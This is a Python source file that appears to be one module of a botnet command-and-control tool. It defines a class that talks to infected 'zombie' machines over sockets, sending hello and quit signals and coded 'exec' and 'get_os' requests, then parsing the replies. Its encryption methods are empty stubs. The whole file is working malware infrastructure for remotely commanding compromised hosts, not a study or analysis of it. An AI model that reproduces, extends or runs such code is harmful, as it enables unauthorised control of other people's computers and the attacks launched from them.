#!/usr/bin/env python3

'''
This script is for making communication between server and clients
like :
sending commands, encryption, decryption &...
'''

from colorama import Fore
import socket
import re

codes_list = {
    'exec':'1',
    '1':'exec',
    '__comment__get_os':'cid=2, does not have second part (for request)',
    'get_os':'2',
    '2':'get_os'
}

class Communicator:
    def __init__(self, zombie_socket, zombie_ip, zombie_port, is_encrypted=False):
        self.zombie_socket = zombie_socket
        self.is_encrypted = is_encrypted # default value is False so the connection is not encrypted by default
        self.zombie_ip = zombie_ip
        self.zombie_port = zombie_port

    def msg_manager(self, msg, is_encrypted=None, has_reply=None, timeout=None):
        if is_encrypted is None:
            is_encrypted = self.is_encrypted
        if is_encrypted:
            self.send_encrypted_msg(msg=msg)
        else:
            if has_reply:
                return self.send_msg(msg=msg, has_reply=has_reply, timeout=timeout)
            self.send_msg(msg=msg, has_reply=False)

    def send_hello_signal(self):
        hello_signal_msg = 'c2x-hello'
        reply = self.msg_manager(msg=hello_signal_msg, has_reply=True, timeout=1.5)
        if reply == 'c2x-hello_back':
            print('Zombie {}:{} sent '.format(self.zombie_ip,self.zombie_port) + Fore.GREEN
                  + 'hello_back' + Fore.RESET + '.')
            print()
            return True
        else:
            print('Zombie {}:{} failed to send '.format(self.zombie_ip,self.zombie_port) + Fore.RED
                  + 'hello_back' + Fore.RESET + '. (connection closed!)')
            print()
            self.zombie_socket.close()
            return False

    def send_quit_signal(self):
        quit_signal_msg = 'c2x-quit'
        self.msg_manager(msg=quit_signal_msg)

    def send_msg(self, msg, has_reply=None, timeout=None):
        # if zombie socket is not specified use default one which created by class constructor

        encoded_msg = msg.encode()
        self.zombie_socket.sendall(encoded_msg)

        if has_reply: # if command send has answer read it
            return self.receive_msg(timeout)

    def send_encrypted_msg(self, msg):
        pass

    def receive_msg(self, timeout=None):
        self.zombie_socket.settimeout(timeout)
        reply = ''
        while True:
            try:
                data = self.zombie_socket.recv(4096)
            except socket.timeout:
                break
            if not data:
                break
            data = data.decode()
            if self.is_encrypted:
                decrypted_reply = self.decrypter(encrypted_msg=data)
                reply = decrypted_reply
            else:
                reply = data
            return reply

    def get_os(self):
        reply = self.msg_manager(msg='cid={},'.format(codes_list['get_os']), has_reply=True)
        if reply:
            get_cid_pattern = r'cid=(\d*),'
            cid = re.findall(get_cid_pattern, reply)
            if len(cid) == 1:
                cid = cid[0]
                if codes_list[cid] == 'get_os':
                    output = reply.split(',')
                    if len(output) >= 2:
                        os_info = ",".join(output[1:])
                        return os_info


    def decrypter(self, encrypted_msg):
        pass

    def close_zombie_socket(self):
        self.zombie_socket.close()
